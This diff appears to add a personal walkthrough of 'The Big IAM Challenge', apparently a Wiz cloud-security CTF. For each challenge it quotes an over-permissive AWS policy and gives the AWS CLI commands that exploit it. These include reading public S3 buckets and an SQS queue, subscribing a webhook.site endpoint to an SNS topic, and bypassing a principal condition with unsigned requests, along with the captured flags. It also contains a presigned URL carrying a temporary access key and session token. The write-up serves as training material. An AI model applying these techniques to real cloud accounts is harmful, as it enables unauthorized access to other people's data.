@@ -1,0 +1,183 @@
+Challenge 1:
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "s3:GetObject",
+            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b/*"
+        },
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "s3:ListBucket",
+            "Resource": "arn:aws:s3:::thebigiamchallenge-storage-9979f4b",
+            "Condition": {
+                "StringLike": {
+                    "s3:prefix": "files/*"
+                }
+            }
+        }
+    ]
+}
+
+
+Command to list the bucket:
+aws s3 ls s3://thebigiamchallenge-storage-9979f4b --recursive --human-readable --summarize
+
+Command to download the file(does not work as files folder is read only):
+aws s3api get-object --bucket s3://thebigiamchallenge-storage-9979f4b --key /files/flag1.txt flag1.txt
+
+Command to download whole bucket(does not work on AWS CLI): 
+aws s3 sync s3://thebigiamchallenge-storage-9979f4b .
+
+Command to copy
+aws s3 cp s3://thebigiamchallenge-storage-9979f4b/files/flag1.txt -
+
+{wiz:exposed-storage-risky-as-usual}
+
+
+
+
+Challenge 2:
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": [
+                "sqs:SendMessage",
+                "sqs:ReceiveMessage"
+            ],
+            "Resource": "arn:aws:sqs:us-east-1:092297851374:wiz-tbic-analytics-sqs-queue-ca7a1b2"
+        }
+    ]
+}
+
+aws sqs receive-message --queue-url https://sqs.us-east-1.amazonaws.com/092297851374/wiz-tbic-analytics-sqs-queue-ca7a1b2
+Try sending message and got the response below:
+{
+    "Messages": [
+        {
+            "MessageId": "939daae8-43e2-4f60-974b-eedde42abbdc",
+            "ReceiptHandle": "AQEBgmzsZ3lccre+SUB08JsA6Y4Wo4j7nmqUIgOYCjatHTbFbNABEoTVDSLAKz6qj+Og3frNEnQxiSu2VpQkA7nbhL6yFl9lx3FAoJr9KZkKVn3lWuY9XpuqJ
+7D1kt2u305jQGNpmzN1Uma21XaxLqa8UiatyvLZvgE2CHPsvsqBtaK2zuWqk6lsXpT/K/3OcXK5WHI2OjmxQCfvFg6yXxgxzpDQvt032okiIOOf88Hjas5CACe7OCD1FwgeDM17aFdUFWBNb271JWBy
+11vwxdAS0TgUWpvJe704LCX6RlmOedt1BZ4mA0P2oXD5i7UAYBVRxQYfl1GtiGOGainRXMMksL4GWXLvwS+PV9rcis6ycwkKwzPKbahajX7mSDeaxXqkTEAzV1Vx0ZC8UI9VCysWYjRDjWkyER105MA
+IJMLpdAk=",
+            "MD5OfBody": "4cb94e2bb71dbd5de6372f7eaea5c3fd",
+            "Body": "{\"URL\": \"https://tbic-wiz-analytics-bucket-b44867f.s3.amazonaws.com/pAXCWLa6ql.html\", \"User-Agent\": \"Lynx/2.5329.3258dev.35
+046 libwww-FM/2.14 SSL-MM/1.4.3714\", \"IsAdmin\": true}"
+        }
+    ]
+}
+
+Since we get an html file inside an S3 bucket in the message body, we can try to view the contents of it.
+
+aws s3 cp s3://tbic-wiz-analytics-bucket-b44867f/pAXCWLa6ql.html -
+{wiz:you-are-at-the-front-of-the-queue}
+
+
+Challenge 3:
+{
+    "Version": "2008-10-17",
+    "Id": "Statement1",
+    "Statement": [
+        {
+            "Sid": "Statement1",
+            "Effect": "Allow",
+            "Principal": {
+                "AWS": "*"
+            },
+            "Action": "SNS:Subscribe",
+            "Resource": "arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications",
+            "Condition": {
+                "StringLike": {
+                    "sns:Endpoint": "*@tbic.wiz.io"
+                }
+            }
+        }
+    ]
+}
+
+Use HTTPS protocol along with this tool https://webhook.site/ to subscribe and receive notifications to this webhook.
+
+aws sns subscribe --topic-arn arn:aws:sns:us-east-1:092297851374:TBICWizPushNotifications --protocol https --notification-endpoint https://webhook.site/4764939d-450e-4704-935b-6f0c0299fbf5/@tbic.wiz.io
+
+Once you confirm the subscription, you will continue to receive notifications with a message. This message is the flag.
+
+Flag: {wiz:always-suspect-asterisks}
+
+
+Challenge 4:
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "s3:GetObject",
+            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321/*"
+        },
+        {
+            "Effect": "Allow",
+            "Principal": "*",
+            "Action": "s3:ListBucket",
+            "Resource": "arn:aws:s3:::thebigiamchallenge-admin-storage-abf1321",
+            "Condition": {
+                "StringLike": {
+                    "s3:prefix": "files/*"
+                },
+                "ForAllValues:StringLike": {
+                    "aws:PrincipalArn": "arn:aws:iam::133713371337:user/admin"
+                }
+            }
+        }
+    ]
+}
+
+aws s3 ls s3://thebigiamchallenge-admin-storage-abf1321/files/ --no-sign-request
+aws s3 cp s3://thebigiamchallenge-admin-storage-abf1321/files/flag-as-admin.txt - --no-sign-request
+{wiz:principal-arn-is-not-what-you-think}
+
+Challenge 5:
+{
+    "Version": "2012-10-17",
+    "Statement": [
+        {
+            "Sid": "VisualEditor0",
+            "Effect": "Allow",
+            "Action": [
+                "mobileanalytics:PutEvents",
+                "cognito-sync:*"
+            ],
+            "Resource": "*"
+        },
+        {
+            "Sid": "VisualEditor1",
+            "Effect": "Allow",
+            "Action": [
+                "s3:GetObject",
+                "s3:ListBucket"
+            ],
+            "Resource": [
+                "arn:aws:s3:::wiz-privatefiles",
+                "arn:aws:s3:::wiz-privatefiles/*"
+            ]
+        }
+    ]
+}
+
+There is an image the the url is 
+https://wiz-privatefiles.s3.amazonaws.com/cognito1.png?AWSAccessKeyId=ASIARK7LBOHXM6NNSUGR&Expires=1693991808&Signature=FBTrFrl0d6DaHpZOOAdyqHpg4sk%3D&x-amz-security-token=IQoJb3JpZ2luX2VjEJn%2F%2F%2F%2F%2F%2F%2F%2F%2F%2FwEaCXVzLWVhc3QtMSJIMEYCIQCjqESIqJF1m%2FrSGbBstrXdawkhBH9LBgSGEGgpX%2FNS%2BwIhAMuOqy%2FNTo0HQWtPCNgz8uJSMZGXD8bE1HLBXRADY7oVKskFCHEQABoMMDkyMjk3ODUxMzc0Igywtnk%2Bmv8a%2BmLjbiQqpgVvT7ZHmbB4gxl1g1HuQrYebQG3W7b%2F%2Bj%2BPj%2FGkE4YF4kCs2z1%2Fa7lyUVLF5mC0lJMi5yRKz4%2FXW8F7g5FjI9%2B6akMt2ZgeFwCdL3mBejHYsd3%2FiPz9fUF7acMNwY1BH9jHFWRzpooPtR2bN81Kw7uZs7P3VDe6%2BsT6Nq%2Bz17DuLSk7YVrWOXH6NCNP8WdaNF14s%2F5tIZXtaen2kSE%2FblAbiQjSqvSEamqFWV4h0f5zHu0aqbl1hTY90OrP98hs9hT8SmQGXaQxjMDx67Aw4rDaZWPH6xUDPgoDr62pWglF1OynfClvLVe4C%2FNbPYdEowsDZfKQyXhLhzJMcTwA5RoHAoCFVBdvCTrROyzHZp83GVFIiaty8cLDe4%2F3JfuvDH0KrsJaXZbcXDTcN1U%2FmScbRsOJJoMqTtLoazM3NpuEirn2PslYWU54b%2ByxEaF1s17xhjqCnftbj2cXtQSJ%2F0ihesoERdwUVL9JGEpWq3W0DqWptz07rGC3x02ra1Mo5YOiaO6g1KWB2FDUwP3670spWVNOug1DkiQeBFAJ9LJFBS3qtiCh9iaAcuAJf61sjuUKIOXJMdEIM5dru8fRHW1DlnAeeXWZP1ZEb8MGJh1JDYFxJiiBrW%2F3I1401PWyeJXLbtjOByFG10Ewa7OOKAeMn3sIWobBnpwKUTG0pyWZ1hR7sSEDXvL%2FwmQKFbjBLAQ9alcGMJbF1rcdzivq3PGncoQqnUpXt1r8ZZpO6gWnwumb5sbWZC6hP3RPsMVLY7lrf1jLUSV%2BzimiA%2FAqKlys8Z4lSLMSjNCPiCCg0QszUBwoQPAvC7JgZ0hbCWslrkfYccQYQN7y5T9MNq3GDoP2jIT25rjqP83EJTx4%2BD%2BWtj1mxJ%2BkbQ%2FahnXHTIaNocO508THj9ow8ergpwY63AKVLZFQ1N4JikB3zXF02ix%2B1NzowhYCAB%2BdIknXIKB1%2F%2BxrvOaFm35GonMly9Bk5TY0WeXb%2FL5Ko58MVXv4K5sOrhSYMKhw50GIDwVW6eGr3ZK6AFMILglnJLlmB6CLeszIAONf6ImDHphAbHB%2FGS1eAuqt3TytDphm%2FLyeVtPDyln2wF5549fnjL1emymX9CLH7%2FU%2Bg%2BAaRtdlYzaUFSRABQ5TEJlFxTFSihVUjZNwzoT9HfnZniQBKFCfEuF1NbxsHSrDWFgbKuQMFm5Z3yOW8zaS2J5sarxz300Uq5szKB5RlYoXt%2BJ62cK2yhvpTmPLAFC4fzgW0mLLISHbhfUwRWTZbiXtbWRfwiUlN%2BaaLA%2BR8PgNyHCZy9e2gEDTSZH5WMCewHRxJ2Xk1xnuL89yK81vF7d%2FnPUrcc%2FeTxwug%2FsamYRr8z%2BeCdAYkuWZo97zeHgy9r6JFwqvpx4%3D
+
+Walkthrough for Q5 and Q6:
+https://infrasec.sh/post/iam_ctf/
+https://iash.dev/posts/the-big-iam-challenge-ctf-walkthrough/
+https://github.com/dibsy/bigiamchallenge
+https://pswalia2u.medium.com/bigiamchallenge-aws-iam-challenges-ded45cb983f2
+
+
+Reference:
+https://cloud.hacktricks.xyz/
